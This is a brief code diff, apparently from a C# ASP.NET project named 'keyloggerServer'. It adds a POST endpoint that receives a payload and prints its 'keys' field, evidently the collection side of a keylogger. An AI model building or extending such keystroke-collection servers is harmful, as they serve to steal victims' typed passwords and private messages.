@@ -29,5 +29,11 @@ namespace keyloggerServer.Controllers
             })
             .ToArray();
         }
+
+        [HttpPost]
+        public void Show([FromBody] LoadedData value)
+        {
+            Console.WriteLine(value.keys);
+        }
     }
 }
